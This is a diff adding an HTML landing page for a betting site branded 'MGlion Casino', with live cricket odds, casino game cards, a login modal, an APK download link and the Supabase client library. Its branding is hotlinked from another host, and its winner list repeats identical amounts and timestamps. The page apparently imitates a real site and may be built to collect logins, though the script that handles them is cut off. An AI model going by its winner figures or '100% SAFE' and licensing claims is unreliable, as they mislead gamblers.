@@ -1,1 +1,1526 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>MGlion Casino</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: "Arial", sans-serif;
+                background-color: #1a1a1a;
+                color: #fff;
+                overflow-x: hidden;
+            }
+
+            /* Header */
+            .header {
+                background-color: #2a2a2a;
+                padding: 15px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                border-bottom: 2px solid #333;
+            }
+
+            .header-left {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .menu-icon {
+                font-size: 24px;
+                cursor: pointer;
+            }
+
+            .logo {
+                font-size: 20px;
+                font-weight: bold;
+                color: #ffd700;
+            }
+            .logo img {
+                height: 20px;
+            }
+
+            .header-right {
+                display: flex;
+                gap: 8px;
+            }
+
+            .btn-small {
+                padding: 6px 12px;
+                font-size: 12px;
+                border: none;
+                cursor: pointer;
+                font-weight: bold;
+            }
+
+            .btn-apk {
+                background-color: #ffd700;
+                color: #000;
+            }
+
+            .btn-register {
+                background-color: #2d8659;
+                color: #fff;
+            }
+
+            .btn-login {
+                background-color: #555;
+                color: #fff;
+            }
+
+            /* Alert Banner */
+            .alert-banner {
+                background-color: #2d8659;
+                padding: 12px 15px;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                font-size: 14px;
+                font-weight: bold;
+            }
+
+            .alert-icon {
+                font-size: 20px;
+            }
+
+            .settings-icon {
+                margin-left: auto;
+                cursor: pointer;
+            }
+
+            /* Event Banner */
+            .event-banner {
+                /* background: linear-gradient(135deg, #1a1a4d 0%, #2d1b4e 100%); */
+                /* padding: 15px; */
+                /* margin: 15px; */
+                border-radius: 8px;
+                text-align: center;
+            }
+
+            .event-banner img {
+                width: 100%;
+                object-fit: contain;
+            }
+
+            .event-title {
+                font-size: 16px;
+                font-weight: bold;
+                color: #ffd700;
+                margin-bottom: 5px;
+            }
+
+            .event-date {
+                font-size: 12px;
+                color: #aaa;
+            }
+
+            /* Section Title */
+            .section-title {
+                background-color: #2d8659;
+                padding: 12px 15px;
+                font-size: 18px;
+                font-weight: bold;
+                margin-top: 15px;
+            }
+
+            /* Winner Announcement */
+            .winner-item {
+                background-color: #2a2a2a;
+                padding: 15px;
+                border-bottom: 1px solid #333;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            .winner-name {
+                font-size: 14px;
+                color: #aaa;
+            }
+
+            .winner-amount {
+                font-size: 16px;
+                font-weight: bold;
+                color: #fff;
+            }
+
+            .winner-date {
+                font-size: 12px;
+                color: #666;
+                margin-top: 5px;
+            }
+
+            /* Trending Games */
+            .games-container {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .game-card {
+                position: relative;
+                border-radius: 8px;
+                overflow: hidden;
+                height: 150px;
+            }
+
+            .game-card img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
+
+            .game-overlay {
+                position: absolute;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.4);
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                color: #fff;
+                text-align: center;
+            }
+
+            .game-name {
+                font-size: 18px;
+                font-weight: bold;
+                color: #ffd700;
+            }
+
+            .game-cta {
+                font-size: 12px;
+                color: #fff;
+                margin-top: 5px;
+            }
+
+            /* Category Tabs */
+            .category-tabs {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 8px;
+                background-color: #1a1a1a;
+            }
+            .casing {
+                height: 110px;
+                border-radius: 8px;
+                object-fit: contain;
+            }
+
+            .category-tab {
+                background-color: #3a3a3a;
+                padding: 12px;
+                text-align: center;
+                border-radius: 4px;
+                font-size: 12px;
+                cursor: pointer;
+                border: 1px solid #444;
+            }
+
+            .category-tab.active {
+                background-color: #2d8659;
+                border-color: #2d8659;
+            }
+
+            /* Live Events */
+            .live-event {
+                background-color: #2a2a2a;
+                margin: 10px 15px;
+                border-radius: 4px;
+                overflow: hidden;
+            }
+
+            .event-header {
+                background-color: #333;
+                padding: 12px;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .live-badge {
+                color: #2d8659;
+                font-weight: bold;
+                font-size: 12px;
+            }
+
+            .event-name {
+                font-size: 14px;
+                flex: 1;
+            }
+
+            .event-odds {
+                display: grid;
+                grid-template-columns: repeat(5, 1fr);
+                gap: 8px;
+                padding: 2px 0px;
+                background-color: #1a1a1a;
+            }
+
+            .odd-box {
+                background-color: #3a3a3a;
+                padding: 10px;
+                text-align: center;
+                border-radius: 4px;
+                font-size: 12px;
+                min-height: 30px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .odd-box.locked {
+                background-color: #4a3a3a;
+                color: #888;
+            }
+            .odd-box.blue {
+                background-color: #72bbef;
+            }
+            .odd-box.pink {
+                background-color: #f994ba;
+            }
+
+            /* Support Section */
+            .support-section {
+                padding: 20px 15px;
+                border-top: 2px dashed #444;
+                margin-top: 20px;
+            }
+
+            .support-title {
+                font-size: 18px;
+                font-weight: bold;
+                margin-bottom: 10px;
+            }
+
+            .support-text {
+                font-size: 13px;
+                color: #aaa;
+                margin-bottom: 15px;
+                line-height: 1.5;
+            }
+
+            .social-icons {
+                display: flex;
+                gap: 10px;
+                justify-content: center;
+                margin-bottom: 20px;
+            }
+
+            .social-icon {
+                width: 45px;
+                height: 45px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 24px;
+                cursor: pointer;
+            }
+
+            .whatsapp {
+                background-color: #25d366;
+            }
+
+            .facebook {
+                background-color: #1877f2;
+            }
+
+            .telegram {
+                background-color: #0088cc;
+            }
+
+            .youtube {
+                background-color: #ff0000;
+            }
+
+            .viber {
+                background-color: #7d3c98;
+            }
+
+            /* Floating Chat Widget */
+            .chat-widget {
+                position: fixed;
+                bottom: 20px;
+                left: 20px;
+                background-color: #ffd700;
+                color: #000;
+                padding: 15px;
+                border-radius: 8px;
+                font-weight: bold;
+                font-size: 13px;
+                max-width: 300px;
+                z-index: 100;
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            }
+
+            /* Floating Social Icons */
+            .floating-socials {
+                position: fixed;
+                right: 10px;
+                top: 50%;
+                transform: translateY(-50%);
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+                z-index: 99;
+            }
+
+            .floating-social {
+                width: 50px;
+                height: 50px;
+                border-radius: 8px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 24px;
+                cursor: pointer;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+            }
+
+            .floating-social.whatsapp {
+                background-color: #25d366;
+            }
+
+            .floating-social.telegram {
+                background-color: #0088cc;
+            }
+
+            .floating-social.info {
+                background-color: #1e40af;
+            }
+
+            .floating-social.notification {
+                background-color: #6366f1;
+            }
+
+            /* About Us Link */
+            .about-us {
+                text-align: center;
+                padding: 15px;
+                text-decoration: underline;
+                color: #aaa;
+                cursor: pointer;
+                font-size: 14px;
+            }
+
+            /* Footer */
+            .footer {
+                background-color: #2a2a2a;
+                padding: 20px 15px;
+                text-align: center;
+                border-top: 1px solid #333;
+                margin-top: 20px;
+            }
+
+            .footer-text {
+                font-size: 12px;
+                color: #666;
+            }
+            .footer-container {
+                max-width: 100%;
+                padding: 30px 20px;
+                background-color: #2a2a2a;
+            }
+
+            .divider {
+                border-top: 2px dashed #555;
+                margin: 20px 0;
+            }
+
+            /* Support Section */
+            .support-section {
+                text-align: center;
+                margin-bottom: 30px;
+            }
+
+            .support-section h2 {
+                font-size: 28px;
+                color: #fff;
+                margin-bottom: 15px;
+                font-weight: 600;
+            }
+
+            .support-contact {
+                color: #b0b0b0;
+                margin-bottom: 20px;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+
+            /* Social Icons */
+            .social-icons {
+                display: flex;
+                justify-content: center;
+                gap: 15px;
+                margin-bottom: 30px;
+                flex-wrap: wrap;
+            }
+
+            .social-icon {
+                width: 50px;
+                height: 50px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: pointer;
+                transition: transform 0.3s ease;
+                font-size: 24px;
+                color: white;
+            }
+
+            .social-icon:hover {
+                transform: scale(1.1);
+            }
+
+            .whatsapp {
+                background-color: #25d366;
+            }
+            .facebook {
+                background-color: #1877f2;
+            }
+            .telegram {
+                background-color: #0088cc;
+            }
+            .youtube {
+                background-color: #ff0000;
+            }
+            .info {
+                background-color: #f0f0f0;
+                color: #333;
+            }
+            .notification {
+                background-color: #5b6ef5;
+            }
+
+            /* Links Section */
+            .links-section {
+                display: flex;
+                justify-content: center;
+                gap: 30px;
+                margin-bottom: 30px;
+                flex-wrap: wrap;
+                font-size: 16px;
+            }
+
+            .links-section a {
+                color: #b0b0b0;
+                text-decoration: underline;
+                cursor: pointer;
+                transition: color 0.3s ease;
+            }
+
+            .links-section a:hover {
+                color: #fff;
+            }
+
+            /* Security Section */
+            .security-section {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 40px;
+                margin-bottom: 30px;
+                flex-wrap: wrap;
+            }
+
+            .ssl-badge {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .ssl-shield {
+                width: 80px;
+                height: 100px;
+                background: linear-gradient(135deg, #7fd856 0%, #5fb83d 100%);
+                border-radius: 8px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 40px;
+                color: white;
+                position: relative;
+                border: 2px solid #4a9d2a;
+            }
+
+            .ssl-text {
+                font-size: 11px;
+                color: #fff;
+                text-align: center;
+                font-weight: bold;
+            }
+
+            .safe-section {
+                text-align: center;
+            }
+
+            .safe-section h3 {
+                color: #fff;
+                font-size: 18px;
+                margin-bottom: 5px;
+            }
+
+            .safe-section p {
+                color: #b0b0b0;
+                font-size: 13px;
+            }
+
+            /* Compliance Logos */
+            .compliance-logos {
+                display: flex;
+                justify-content: center;
+                gap: 30px;
+                align-items: center;
+                margin-top: 20px;
+                flex-wrap: wrap;
+            }
+
+            .compliance-logo {
+                width: 60px;
+                height: 60px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 24px;
+                color: #b0b0b0;
+                border: 2px solid #b0b0b0;
+                border-radius: 50%;
+            }
+
+            .compliance-logo.age {
+                font-weight: bold;
+                font-size: 20px;
+            }
+
+            /* Legal Text */
+            .legal-section {
+                text-align: center;
+                margin-bottom: 30px;
+                padding: 20px;
+                background-color: #1f1f1f;
+                border-radius: 4px;
+            }
+
+            .legal-section p {
+                color: #999;
+                font-size: 13px;
+                line-height: 1.8;
+                margin-bottom: 15px;
+            }
+
+            .copyright {
+                color: #777;
+                font-size: 12px;
+                margin-top: 20px;
+            }
+
+            /* Mobile Responsive */
+            @media (max-width: 768px) {
+                .footer-container {
+                    padding: 20px 15px;
+                }
+
+                .support-section h2 {
+                    font-size: 24px;
+                }
+
+                .links-section {
+                    gap: 15px;
+                    font-size: 14px;
+                }
+
+                .security-section {
+                    gap: 20px;
+                }
+
+                .compliance-logos {
+                    gap: 15px;
+                }
+
+                .social-icon {
+                    width: 45px;
+                    height: 45px;
+                    font-size: 20px;
+                }
+            }
+
+            @media (max-width: 480px) {
+                .footer-container {
+                    padding: 15px 12px;
+                }
+
+                .support-section h2 {
+                    font-size: 20px;
+                }
+
+                .support-contact {
+                    font-size: 12px;
+                }
+
+                .links-section {
+                    gap: 10px;
+                    font-size: 12px;
+                    flex-direction: column;
+                }
+
+                .security-section {
+                    gap: 15px;
+                    flex-direction: column;
+                }
+
+                .social-icon {
+                    width: 40px;
+                    height: 40px;
+                    font-size: 18px;
+                }
+
+                .ssl-shield {
+                    width: 70px;
+                    height: 85px;
+                    font-size: 32px;
+                }
+
+                .compliance-logo {
+                    width: 50px;
+                    height: 50px;
+                    font-size: 20px;
+                }
+
+                .legal-section p {
+                    font-size: 11px;
+                }
+            }
+            .winner-container {
+                max-height: 300px;
+                overflow-y: auto;
+            }
+            .live-event-container {
+                max-height: 400px;
+                overflow-y: auto;
+            }
+            .container {
+                text-align: center;
+            }
+
+            .login-btn {
+                background: linear-gradient(135deg, #2d8659 0%, #1f5a3f 100%);
+                color: white;
+                border: none;
+                padding: 16px 40px;
+                font-size: 18px;
+                font-weight: 600;
+                border-radius: 8px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                box-shadow: 0 4px 15px rgba(45, 134, 89, 0.3);
+            }
+
+            .login-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 20px rgba(45, 134, 89, 0.4);
+            }
+
+            .login-btn:active {
+                transform: translateY(0);
+            }
+
+            /* Modal Styles */
+            .modal {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.7);
+                z-index: 1000;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+
+            .modal.active {
+                display: flex;
+            }
+
+            .modal-content {
+                background: #1a1a1a;
+                border-radius: 12px;
+                width: 100%;
+                max-width: 500px;
+                max-height: 90vh;
+                overflow-y: auto;
+                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            }
+
+            .modal-header {
+                background: #000;
+                padding: 20px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                border-bottom: 1px solid #333;
+            }
+
+            .modal-header h2 {
+                color: white;
+                font-size: 28px;
+                font-weight: 600;
+            }
+
+            .close-btn {
+                background: transparent;
+                border: 2px solid #e74c3c;
+                color: #e74c3c;
+                width: 40px;
+                height: 40px;
+                border-radius: 50%;
+                font-size: 24px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                transition: all 0.3s ease;
+            }
+
+            .close-btn:hover {
+                background: #e74c3c;
+                color: white;
+            }
+
+            .modal-body {
+                padding: 30px 20px;
+                background: #2a2a2a;
+            }
+
+            .form-group {
+                margin-bottom: 20px;
+                text-align: left;
+            }
+
+            .form-group label {
+                display: block;
+                color: white;
+                font-size: 16px;
+                font-weight: 600;
+                margin-bottom: 10px;
+            }
+
+            .form-group input {
+                width: 100%;
+                padding: 14px;
+                background: #3a3a3a;
+                border: 1px solid #444;
+                color: white;
+                font-size: 16px;
+                border-radius: 6px;
+                transition: all 0.3s ease;
+            }
+
+            .form-group input::placeholder {
+                color: #888;
+            }
+
+            .form-group input:focus {
+                outline: none;
+                border-color: #2d8659;
+                background: #404040;
+            }
+
+            .password-wrapper {
+                position: relative;
+            }
+
+            .toggle-password {
+                position: absolute;
+                right: 14px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: #555;
+                border: none;
+                color: white;
+                cursor: pointer;
+                font-size: 20px;
+                width: 40px;
+                height: 40px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                border-radius: 4px;
+                transition: all 0.3s ease;
+            }
+
+            .toggle-password:hover {
+                background: #666;
+            }
+
+            .checkbox-group {
+                display: flex;
+                align-items: flex-start;
+                gap: 12px;
+                margin-bottom: 20px;
+                font-size: 14px;
+                color: #ccc;
+            }
+
+            .checkbox-group input[type="checkbox"] {
+                width: 20px;
+                height: 20px;
+                margin-top: 2px;
+                cursor: pointer;
+                accent-color: #2d8659;
+                flex-shrink: 0;
+            }
+
+            .checkbox-group a {
+                color: #2d8659;
+                text-decoration: none;
+                transition: color 0.3s ease;
+            }
+
+            .checkbox-group a:hover {
+                color: #3fa870;
+                text-decoration: underline;
+            }
+
+            .checkbox-group .red-text {
+                color: #e74c3c;
+            }
+
+            .login-submit-btn {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #2d8659 0%, #1f5a3f 100%);
+                color: white;
+                border: none;
+                font-size: 16px;
+                font-weight: 600;
+                border-radius: 6px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-bottom: 20px;
+            }
+
+            .login-submit-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 4px 12px rgba(45, 134, 89, 0.3);
+            }
+
+            .divider {
+                display: flex;
+                align-items: center;
+                gap: 15px;
+                margin: 25px 0;
+                color: #888;
+            }
+
+            .divider::before,
+            .divider::after {
+                content: "";
+                flex: 1;
+                height: 1px;
+                background: linear-gradient(
+                    90deg,
+                    #2d8659 0%,
+                    transparent 100%
+                );
+            }
+
+            .divider::after {
+                background: linear-gradient(
+                    90deg,
+                    transparent 0%,
+                    #2d8659 100%
+                );
+            }
+
+            .demo-btn {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #2d8659 0%, #1f5a3f 100%);
+                color: white;
+                border: none;
+                font-size: 16px;
+                font-weight: 600;
+                border-radius: 6px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-bottom: 20px;
+            }
+
+            .demo-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 4px 12px rgba(45, 134, 89, 0.3);
+            }
+
+            .recaptcha-notice {
+                font-size: 12px;
+                color: #999;
+                text-align: center;
+                line-height: 1.6;
+            }
+
+            .recaptcha-notice a {
+                color: #2d8659;
+                text-decoration: none;
+                transition: color 0.3s ease;
+            }
+
+            .recaptcha-notice a:hover {
+                color: #3fa870;
+                text-decoration: underline;
+            }
+
+            @media (max-width: 480px) {
+                .modal-content {
+                    max-width: 100%;
+                }
+
+                .modal-body {
+                    padding: 20px 15px;
+                }
+
+                .modal-header h2 {
+                    font-size: 24px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <!-- Header -->
+        <div class="header">
+            <div class="header-left">
+                <div class="menu-icon">☰</div>
+                <div class="logo">
+                    <!-- 🦁MGlion -->
+                    <img
+                        src="https://sitethemedata.com/sitethemes/mglion.com/front/logo.png"
+                        alt="logo"
+                    />
+                </div>
+            </div>
+            <div class="header-right">
+                <button class="btn-small btn-apk">
+                    <a href="https://sitethemedata.com/apk/mglion-148.apk"
+                        >APK</a
+                    >
+                </button>
+                <button class="btn-small btn-register" onclick="openModal()">
+                    REGISTER
+                </button>
+                <button class="btn-small btn-login" onclick="openModal()">
+                    LOGIN
+                </button>
+            </div>
+        </div>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <span class="alert-icon">🔔</span>
+            <span>Alert 🔴 BEFORE PAY IN BANK please CONFIRM BAN</span>
+            <span class="settings-icon">⚙️</span>
+        </div>
+
+        <!-- Event Banner -->
+        <div class="event-banner">
+            <img
+                src="https://sitethemedata.com/sitethemes/mglion.com/front/banners/1758871213039.jpg"
+                alt="Event"
+            />
+        </div>
+
+        <!-- Now Trending -->
+        <div class="section-title">Now Trending</div>
+        <div class="games-container">
+            <div class="game-card">
+                <img
+                    src="https://sitethemedata.com/sitethemes/common1/front/sidebanners/1757315985321.webp"
+                    alt="Lucky 6"
+                />
+                <div class="game-overlay">
+                    <div class="game-name">LUCKY 6</div>
+                    <div class="game-cta">PLAY NOW</div>
+                </div>
+            </div>
+            <div class="game-card">
+                <img
+                    src="https://sitethemedata.com/sitethemes/common1/front/sidebanners/1758262536966.webp"
+                    alt="Lucky 7"
+                />
+                <div class="game-overlay">
+                    <div class="game-name">LUCKY 7</div>
+                    <div class="game-cta">PLAY NOW</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Category Tabs -->
+        <div class="category-tabs">
+            <!-- <div class="category-tab">Sports Book</div>
+            <div class="category-tab">Lottery</div>
+            <div class="category-tab">Exchange</div>
+            <div class="category-tab">Live Casino</div>
+            <div class="category-tab">Slot</div>
+            <div class="category-tab">Fantasy Games</div>
+            <div class="category-tab active">Cricket</div>
+            <div class="category-tab">Politics</div>
+            <div class="category-tab">Football</div> -->
+        </div>
+        <div class="event-banner">
+            <img
+                src="https://res.cloudinary.com/dvt5ndw4d/image/upload/v1760846157/WhatsApp_Image_2025-10-19_at_09.25.43_qckhmb.jpg"
+                alt="Event"
+            />
+        </div>
+
+        <div class="live-event-container">
+            <!-- Live Events -->
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name">Super Over2</span>
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                </div>
+            </div>
+
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name">ICC Womens Cricket World...</span>
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box locked">🔒</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box locked">🔒</div>
+                </div>
+            </div>
+
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name"
+                        >Northern Raider v Overberg...</span
+                    >
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                </div>
+            </div>
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name">Australia Vs India</span>
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                </div>
+            </div>
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name"> India W v England W </span>
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box blue">1.68</div>
+                    <div class="odd-box pink">1.68</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box blue">2.4</div>
+                </div>
+            </div>
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name"> Pakistan v South Africa </span>
+                </div>
+
+                <div class="event-odds">
+                    <div class="odd-box blue">1.79</div>
+                    <div class="odd-box pink">1.8</div>
+                    <div class="odd-box blue">14.5</div>
+                    <div class="odd-box pink">15</div>
+                    <div class="odd-box blue">2.66</div>
+                </div>
+            </div>
+            <div class="live-event">
+                <div class="event-header">
+                    <span class="live-badge">● Live</span>
+                    <span class="event-name">Srilanka vs Bangladesh</span>
+                </div>
+                <div class="event-odds">
+                    <div class="odd-box pink">2.16</div>
+                    <div class="odd-box blue">2.36</div>
+                    <div class="odd-box">−</div>
+                    <div class="odd-box pink">1.74</div>
+                    <div class="odd-box blue">1.86</div>
+                </div>
+            </div>
+        </div>
+        <!-- Our Casino Section -->
+        <div class="section-title">Our Casino</div>
+        <div class="games-container">
+            <div class="game-card">
+                <img
+                    src="https://sitethemedata.com/casino_icons/lc/lucky15.jpg"
+                    alt="Queen Top"
+                />
+                <div class="game-overlay">
+                    <div class="game-name">QUEEN TOP</div>
+                    <div class="game-cta">OPEN TEENPATTI</div>
+                </div>
+            </div>
+            <div class="game-card">
+                <img
+                    src="https://sitethemedata.com/casino_icons/lc/teenunique.jpg"
+                    alt="Super Over"
+                />
+                <div class="game-overlay">
+                    <div class="game-name">SUPER OVER 2</div>
+                    <div class="game-cta">IND V ENG</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Winner Announcement -->
+        <div class="section-title">Winner Announcement</div>
+        <div class="winner-container">
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">ri****</div>
+                    <div class="winner-date">05/04/2025</div>
+                </div>
+                <div class="winner-amount">94</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">kr****</div>
+                    <div class="winner-date">13/02/2024 22:53</div>
+                </div>
+                <div class="winner-amount">70</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">pr****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">kr****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">r****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">g****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">m****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">a****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">z****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">k****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">kj****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+            <div class="winner-item">
+                <div>
+                    <div class="winner-name">pr****</div>
+                    <div class="winner-date">07/03/2023 17:16</div>
+                </div>
+                <div class="winner-amount">69,86,300</div>
+            </div>
+        </div>
+
+        <!-- Floating Chat Widget -->
+        <div class="chat-widget">💬 NEW ID & SUPPORT MESS...</div>
+
+        <div class="footer-container">
+            <!-- Support Section -->
+            <div class="support-section">
+                <h2>24X7 Support</h2>
+                <div class="support-contact">
+                    <p>
+                        +918988888039 Please Contact on Whatsapp anytype of
+                        support & any inquiry
+                    </p>
+                </div>
+
+                <!-- Social Icons -->
+                <div class="social-icons">
+                    <div class="social-icon whatsapp">💬</div>
+                    <div class="social-icon facebook">f</div>
+                    <div class="social-icon telegram">✈️</div>
+                    <div class="social-icon youtube">▶️</div>
+                    <div class="social-icon info">ℹ️</div>
+                    <div class="social-icon notification">◉</div>
+                </div>
+            </div>
+
+            <!-- Links Section -->
+            <div class="links-section">
+                <a href="#about">About Us</a>
+                <a href="#terms">Terms and Conditions</a>
+                <a href="#responsible">Responsible Gaming</a>
+            </div>
+
+            <!-- Security Section -->
+            <div class="security-section">
+                <div class="ssl-badge">
+                    <div class="ssl-shield">✓</div>
+                    <div class="ssl-text">SECURE<br />SSL ENCRYPTION</div>
+                </div>
+
+                <div class="safe-section">
+                    <h3>100% SAFE</h3>
+                    <p>Protected connection and encrypted data</p>
+                </div>
+
+                <div class="compliance-logos">
+                    <div class="compliance-logo age">18+</div>
+                    <div class="compliance-logo">♻️</div>
+                    <div class="compliance-logo">gt</div>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <!-- Legal Section -->
+            <div class="legal-section">
+                <p>
+                    This website mglion.com is owned and operated by GIT
+                    Operations. registration number:148532, registered address:
+                    Heelsumstraat 51 Curaçao. Contact us info@mglion.com.
+                    mglion.com is licensed and regulated by the Government of
+                    the Autonomous Island of Anjouan, Union of Comoros and
+                    operates under License No. ALSI-102310007-FI5. mglion.com
+                    has passed all regulatory compliance and is legally
+                    authorized to conduct gaming operations for any and all
+                    games of chance and wagering.
+                </p>
+                <p class="copyright">© Copyright 2020. All Rights Reserved.</p>
+            </div>
+        </div>
+
+        <div class="modal" id="loginModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Login</h2>
+                    <button class="close-btn" onclick="closeModal()">✕</button>
+                </div>
+
+                <div class="modal-body">
+                    <form onsubmit="handleLogin(event)">
+                        <!-- Username Field -->
+                        <div class="form-group">
+                            <label for="username">Username</label>
+                            <input
+                                type="text"
+                                id="username"
+                                placeholder="Enter Username"
+                                required
+                            />
+                        </div>
+
+                        <!-- Password Field -->
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <div class="password-wrapper">
+                                <input
+                                    type="password"
+                                    id="password"
+                                    placeholder="Enter Password"
+                                    required
+                                />
+                                <button
+                                    type="button"
+                                    class="toggle-password"
+                                    onclick="togglePassword()"
+                                >
+                                    👁️
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Age Verification Checkbox -->
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="ageCheck" required />
+                            <label
+                                for="ageCheck"
+                                style="margin: 0; cursor: pointer"
+                            >
+                                I am at least
+                                <span class="red-text">18 years</span> of age
+                                and I have read, accept and agree to the
+                                <a href="#terms">Terms and Conditions</a>,
+                                <a href="#responsible">Responsible Gaming</a>,
+                                <a href="#gamcare">GamCare</a>,
+                                <a href="#therapy">Gambling Therapy</a>
+                            </label>
+                        </div>
+
+                        <!-- Login Button -->
+                        <button type="submit" class="login-submit-btn">
+                            Login
+                        </button>
+
+                        <!-- Divider -->
+                        <!-- <div class="divider">or</div> -->
+
+                        <!-- Request Demo Button -->
+                        <!-- <button
+                            type="button"
+                            class="demo-btn"
+                            onclick="requestDemo()"
+                        >
+                            Request a Demo
+                        </button> -->
+
+                        <!-- reCAPTCHA Notice -->
+                        <div class="recaptcha-notice">
+                            This site is protected by reCAPTCHA and the Google
+                            <a href="#privacy">Privacy Policy</a> and
+                            <a href="#terms">Terms of Service</a> apply.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+        <script>
+            function openModal() {
+                document.getElementById("loginModal").classList.add("active");
